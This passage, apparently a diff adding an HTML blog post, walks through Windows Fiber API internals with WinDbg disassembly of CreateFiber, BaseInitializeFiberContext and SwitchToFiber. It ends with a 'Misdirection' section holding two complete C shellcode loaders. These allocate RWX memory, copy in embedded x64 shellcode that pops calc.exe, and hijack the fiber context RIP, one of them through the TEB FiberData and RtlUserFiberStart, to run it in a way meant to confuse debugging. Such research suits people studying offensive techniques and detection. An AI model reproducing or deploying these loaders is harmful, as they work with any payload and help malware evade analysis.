+00007ffc`cdcf56b4 488d05d5d60600     lea     rax, [KERNELBASE!BaseFiberStart (00007ffc`cdd62d90)]
+00007ffc`cdcf56bb 48894378           mov     qword ptr [rbx+78h], rax
+00007ffc`cdcf56bf 482bfa             sub     rdi, rdx
+00007ffc`cdcf56c2 894b34             mov     dword ptr [rbx+34h], ecx
+00007ffc`cdcf56c5 b87f020000         mov     eax, 27Fh
+00007ffc`cdcf56ca 898b18010000       mov     dword ptr [rbx+118h], ecx
+00007ffc`cdcf56d0 b92b000000         mov     ecx, 2Bh
+00007ffc`cdcf56d5 66898300010000     mov     word ptr [rbx+100h], ax
+00007ffc`cdcf56dc 66894b42           mov     word ptr [rbx+42h], cx
+00007ffc`cdcf56e0 4889ab88000000     mov     qword ptr [rbx+88h], rbp
+00007ffc`cdcf56e7 488b6c2438         mov     rbp, qword ptr [rsp+38h]
+00007ffc`cdcf56ec 8d4108             lea     eax, [rcx+8]
+00007ffc`cdcf56ef 66894338           mov     word ptr [rbx+38h], ax
+00007ffc`cdcf56f3 488d4fd0           lea     rcx, [rdi-30h]
+00007ffc`cdcf56f7 488b442450         mov     rax, qword ptr [rsp+50h]
+00007ffc`cdcf56fc c7433a2b002b00     mov     dword ptr [rbx+3Ah], 2B002Bh
+00007ffc`cdcf5703 c7433e53002b00     mov     dword ptr [rbx+3Eh], 2B0053h
+00007ffc`cdcf570a 48898b98000000     mov     qword ptr [rbx+98h], rcx
+00007ffc`cdcf5711 488b5c2430         mov     rbx, qword ptr [rsp+30h]
+00007ffc`cdcf5716 488901             mov     qword ptr [rcx], rax
+00007ffc`cdcf5719 4883c420           add     rsp, 20h
+00007ffc`cdcf571d 5f                 pop     rdi
+00007ffc`cdcf571e c3                 ret     
+00007ffc`cdcf571f cc                 int     3
+00007ffc`cdcf5720 33d2               xor     edx, edx
+00007ffc`cdcf5722 e97cffffff         jmp     KERNELBASE!BaseInitializeFiberContext+0x63 (00007ffc`cdcf56a3)
+</pre>
+
+<pre class="text">
+From all of this we can see the allocation of the FIBER struct, allocating/constructing the ActCtx and the stack, instantiating the CONTEXT for the fiber with the instruction pointer to our fiber routine!
+Awesome!
+So now that means the offset of the instruction pointer is at offset 0x80 + 0x30 from the CONTEXT, <b>0xB0</b>.
+
+A quick definition of ReactOS' <a href="https://doxygen.reactos.org/dd/d83/ndk_2ketypes_8h_source.html">FIBER</a> structure:
+<b>Note: This structure is not complete for replication in W10 20H2 x64 (not sure about others)</b>
+</pre>
+<pre class="code">
+typedef struct _FIBER                                    /* Field offsets:    */
+{                                                        /* i386  arm   x64   */
+    PVOID FiberData;                                     /* 0x000 0x000 0x000 */
+    struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList;/* 0x004 0x004 0x008 */
+    PVOID StackBase;                                     /* 0x008 0x008 0x010 */
+    PVOID StackLimit;                                    /* 0x00C 0x00C 0x018 */
+    PVOID DeallocationStack;                             /* 0x010 0x010 0x020 */
+    CONTEXT FiberContext;                                /* 0x014 0x018 0x030 */
+#if (NTDDI_VERSION >= NTDDI_LONGHORN)
+    PVOID Wx86Tib;                                       /* 0x2E0 0x1b8 0x500 */
+    struct _ACTIVATION_CONTEXT_STACK *ActivationContextStackPointer; /* 0x2E4 0x1bc 0x508 */
+    PVOID FlsData;                                       /* 0x2E8 0x1c0 0x510 */
+    ULONG GuaranteedStackBytes;                          /* 0x2EC 0x1c4 0x518 */
+    ULONG TebFlags;                                      /* 0x2F0 0x1c8 0x51C */
+#else
+    ULONG GuaranteedStackBytes;                          /* 0x2E0         */
+    PVOID FlsData;                                       /* 0x2E4         */
+    struct _ACTIVATION_CONTEXT_STACK *ActivationContextStackPointer;
+#endif
+} FIBER, *PFIBER;
+</pre>
+<pre class="text">
+Let's check out this CONTEXT within our LPVOID from CreateFiber to ensure the CONTEXT indeed has our <b>HotPotatoOne</b> address.
+</pre>
+<pre class="code">
+<b>Immediately after our call to CreateFiber(0, HotPotatoOne, &potato)</b>
+0:000> u rip-6
+FiberBlog!main+0x46 [Source.cpp @ 23]:
+00007ff6`49e55d76 ff158cb20000    call    qword ptr [FiberBlog!_imp_CreateFiber (00007ff6`49e61008)]
+<b class="green">00007ff6`49e55d7c 48894528        mov     qword ptr [rbp+28h],rax ; rip, rax contains fiber object</b>
+00007ff6`49e55d80 4c8d0589790000  lea     r8,[FiberBlog!potato (00007ff6`49e5d710)]
+00007ff6`49e55d87 488d1564b6ffff  lea     rdx,[FiberBlog!ILT+1005(?HotPotatoTwoYAXPEAXZ) (00007ff6`49e513f2)]
+00007ff6`49e55d8e 33c9            xor     ecx,ecx
+00007ff6`49e55d90 ff1572b20000    call    qword ptr [FiberBlog!_imp_CreateFiber (00007ff6`49e61008)]
+00007ff6`49e55d96 48894548        mov     qword ptr [rbp+48h],rax
+00007ff6`49e55d9a 4c8d056f790000  lea     r8,[FiberBlog!potato (00007ff6`49e5d710)]
+
+<b>check the LPVOID fiber object for our fiber's instruction pointer, rax + 0xB0</b>
+0:000> dq rax+0xb0 L1
+000002aa`f96b2450  <b class="green">00007ff6`49e513f7</b>
+0:000> u poi(rax+0xb0)
+FiberBlog!ILT+1010(?HotPotatoOneYAXPEAXZ):
+<b class="green">00007ff6`49e513f7</b> e914460000      jmp     FiberBlog!HotPotatoOne (00007ff6`49e55a10)
+</pre>
+
+<pre class="text">
+Nice! The fiber routine's instruction pointer is at the fiber object + 0xb0!
+
+So far we've seen how to use them, how control flow works, a bit about how they're created, and now let's talk execution!
+</pre>
+
+<h3 id="3">0x03: Execution</h3>
+<pre class="text">
+Looking back on our <b>HotPotatoOne's</b> control flow decisions, you may be wondering:
+"How does switching work such that you needed the do/while?"
+WELL, I'm glad you asked!
+
+When one fiber switches to another via SwitchToFiber, the current execution context information is saved to that fiber object's context structure.
+We can see in more detail as we look at the disassembly of KernelBase!SwitchToFiber:
+</pre>    
+<pre class="code">
+KERNELBASE!SwitchToFiber:
+00007ffc`cdd5acd0 4883ec28           sub     rsp, 28h
+00007ffc`cdd5acd4 65488b042530000000 mov     rax, qword ptr gs:[30h]
+00007ffc`cdd5acdd 483b4820           cmp     rcx, qword ptr [rax+20h]
+00007ffc`cdd5ace1 7420               je      KERNELBASE!SwitchToFiber+0x33 (00007ffc`cdd5ad03)
+00007ffc`cdd5ace3 488b4110           mov     rax, qword ptr [rcx+10h]
+00007ffc`cdd5ace7 483305da102200     xor     rax, qword ptr [KERNELBASE!BasepFiberCookie (00007ffc`cdf7bdc8)]
+00007ffc`cdd5acee 4833c1             xor     rax, rcx
+00007ffc`cdd5acf1 48398120050000     cmp     qword ptr [rcx+520h], rax
+00007ffc`cdd5acf8 0f85dc750400       jne     KERNELBASE!SwitchToFiber+0x4760a (00007ffc`cdda22da)
+<b class="green">00007ffc`cdd5acfe e86d720200         call    KERNELBASE!SwitchToFiberContext (00007ffc`cdd81f70) ; Where the real magic happens</b>
+00007ffc`cdd5ad03 4883c428           add     rsp, 28h
+00007ffc`cdd5ad07 c3                 ret     
+</pre>
+<pre class="text">
+Most importantly, we see a call to KernelBase!SwitchToFiberContext.
+This function is responsible for saving off our fiber object's context, and changing the next execution context to the destination fiber object's context.
+
+When HotPotatoThree switches back to HotPotatoOne, the SwitchToFiberContext function restores the stack such that execution returns into the fiber after the call to SwitchToFiberContext.
+Since <b>HotPotatoOne</b> called SwitchToFiber, the return back to <b>HotPotatoOne</b> from SwitchToFiber is done by returning from SwitchToFiberContext:
+</pre>
+<pre class="code">
+0:000> u rip-0x10
+KERNELBASE!SwitchToFiberContext+0x1f0:
+00007ffc`cdd82160 50              push    rax
+00007ffc`cdd82161 3441            xor     al,41h
+00007ffc`cdd82163 d9a800010000    fldcw   word ptr [rax+100h]
+<b class="green">00007ffc`cdd82169 498ba098000000  mov     rsp,qword ptr [r8+98h] ; restore original rsp</b>
+<b class="green">00007ffc`cdd82170 c3              ret ; <- CURRENT RIP</b>
+00007ffc`cdd82170 c3              ret
+
+0:000> dq rsp L1
+<b class="green">000000c4`536ff6b8  00007ffc`cdd5ad03 ; Return to KernelBase!SwitchToFiber</b>
+
+0:000> t <b class="green">return into SwitchToFiber</b>
+Time Travel Position: 102:AA
+KERNELBASE!SwitchToFiber+0x33:
+00007ffc`cdd5ad03 4883c428        add     rsp,28h
+
+0:000> t <b class="green">step to the return instruction</b>
+Time Travel Position: 102:AB
+KERNELBASE!SwitchToFiber+0x37:
+00007ffc`cdd5ad07 c3              ret 
+
+0:000> dq rsp L1 <b class="green">see where we're returning to.... aaaand!</b>
+000000c4`536ff6e8  00007ff6`49e55a89
+
+0:000> u poi(rsp)
+<b class="green">FiberBlog!HotPotatoOne+0x79 [Source.cpp @ 54]: HELL yes! A return finally back into HotPotatoOne from HotPotatoThree</b>
+00007ff6`49e55a89 488b4508        mov     rax,qword ptr [rbp+8]
+00007ff6`49e55a8d 813839050000    cmp     dword ptr [rax],539h
+00007ff6`49e55a93 72ba            jb      FiberBlog!HotPotatoOne+0x3f (00007ff6`49e55a4f)
+00007ff6`49e55a95 b808000000      mov     eax,8
+00007ff6`49e55a9a 486bc000        imul    rax,rax,0
+00007ff6`49e55a9e 488d0d737c0000  lea     rcx,[FiberBlog!HOT_POTATOES (00007ff6`49e5d718)]
+00007ff6`49e55aa5 488b0c01        mov     rcx,qword ptr [rcx+rax]
+00007ff6`49e55aa9 ff1551b50000    call    qword ptr [FiberBlog!_imp_SwitchToFiber (00007ff6`49e61000)]
+</b>
+</pre>
+<pre class="text">
+Phew.
+Quite the long journey so far, but we did it!
+Now for the fun part.
+</pre>
+
+<h3 id="4">0x04: Misdirection</h3>
+<pre class="text">
+We've talked about how fibers are created, allocated, switched to, and where the initial instruction pointer lives in memory.
+Let's put this all together to cause some debugging pain.
+
+I give you:
+<b class="green">Two methods to execute shellcode in a really weird way. ¯\_(ツ)_/¯</b>
+
+Method 1:
+</pre>
+<pre class="code">
+#include <Windows.h>
+#include <stdio.h>
+
+#define TEB_FIBERDATA_PTR_OFFSET 0x17ee
+#define LPFIBER_RIP_OFFSET 0x0a8
+
+// calc shellcode
+unsigned char op[] =
+"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
+"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
+"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
+"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
+"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
+"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
+"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
+"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
+"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
+"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
+"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
+"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
+"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
+"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
+"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
+"\x63\x2e\x65\x78\x65\x00";
+
+typedef int(WINAPI* tRtlUserFiberStart)(); 
+
+int main() {
+    HMODULE hMod = GetModuleHandleA("ntdll");
+    if (!hMod) { return -1; }
+    tRtlUserFiberStart lpRtlUserFiberStart = (tRtlUserFiberStart) GetProcAddress(hMod, "RtlUserFiberStart");
+    if (!lpRtlUserFiberStart) { return -1; }
+
+    _TEB* teb = NtCurrentTeb();
+    NT_TIB* tib = (NT_TIB*)teb;
+    void* pTebFlags = (void*)((uintptr_t)teb + TEB_FIBERDATA_PTR_OFFSET);
+    *(char*)pTebFlags = *(char*)pTebFlags | 0b100; // set the HasFiberData bit
+
+    LPVOID addr = VirtualAlloc(NULL, sizeof(op), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!addr) {
+        return GetLastError();
+    }
+    RtlMoveMemory(addr, op, sizeof(op));
+
+    uintptr_t lpDummyFiberData = (uintptr_t)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100);
+    *(LPVOID*)(lpDummyFiberData + LPFIBER_RIP_OFFSET) = addr; // store the shelcode address at the offset of the FiberContext RIP in the Fiber Data
+    //call    qword ptr [ntdll!_guard_dispatch_icall_fptr (00007ffa`218b4000)] ds:00007ffa`218b4000={ntdll!guard_dispatch_icall_nop (00007ffa`217cfa80)}
+
+    __writegsqword(0x20, lpDummyFiberData); // set the FiberData pointer
+    lpRtlUserFiberStart();
+}
+</pre>
+<pre class="text">
+Huge shoutout to s4r1n.
+From <a href="https://github.com/S4R1N/AlternativeShellcodeExec">my contribution to his repo</a>
+Method 2: 
+</pre>
+<pre class="code">
+#include <Windows.h>
+#include <stdio.h>
+
+// calc shellcode
+unsigned char op[] =
+"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
+"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
+"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
+"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
+"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
+"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
+"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
+"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
+"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
+"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
+"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
+"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
+"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
+"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
+"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
+"\x63\x2e\x65\x78\x65\x00";
+
+void dummy() {
+    puts("Hello Fiber from Dummy");
+}
+
+
+//https://github.com/reactos/reactos/blob/2e1aeb12dfd8b44b4b57d377b59ef347dfe3386e/dll/win32/kernel32/client/fiber.c
+//https://doxygen.reactos.org/dd/d83/ndk_2ketypes_8h_source.html#l00179
+
+
+// s/o to ch3rn0byl and s4r1n
+// am I doing s00p3r c001 1337 gr33tz right?
+int main() {
+    LPVOID addr = VirtualAlloc(NULL, sizeof(op), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!addr) {
+        return GetLastError();
+    }
+    RtlMoveMemory(addr, op, sizeof(op));
+
+    _TEB* teb = NtCurrentTeb();
+    NT_TIB* tib = (NT_TIB*)teb;
+
+    //https://github.com/reactos/reactos/blob/2e1aeb12dfd8b44b4b57d377b59ef347dfe3386e/dll/win32/kernel32/client/fiber.c#L256
+    ConvertThreadToFiber(NULL);
+
+    LPVOID lpFiber = CreateFiber(0x100, (LPFIBER_START_ROUTINE)dummy, NULL);
+    if (lpFiber == NULL) {
+        printf("GLE : %d", GetLastError());
+        exit(0);
+    }
+
+    uintptr_t* tgtFuncAddr = (uintptr_t*)((uintptr_t)lpFiber + 0xB0);
+    *tgtFuncAddr = (uintptr_t)addr;
+
+    SwitchToFiber(lpFiber);
+    return 1;
+}
+</pre>
+<pre class="text">
+Thank you for reading!
+I hope at the very least you learned something neat about the Windows Fiber API.
+
+Some great links:
+https://nullprogram.com/blog/2019/03/28/
+https://devblogs.microsoft.com/oldnewthing/20191011-00/?p=102989
+
+s/o to all the cool as hell people in my life. 
+You know who you are.
+
+🚀
+</pre>
+
+
+        </div>
+    </body>
+    <footer>
+            <center>
+                <pre class="text"><a href="index.html">Home</a> | <a href="blog.html">Blog</a> | <a href="about.html">About</a> | <a href="https://github.com/alfarom256">Github</a></pre>
+                <pre class="text" style="font-size: 12;">Design inspired by <a href="https://tmpout.sh">tmpout.sh</a> :)</pre>
+            </center>  
+    </footer>
+</div>
+</html>
+
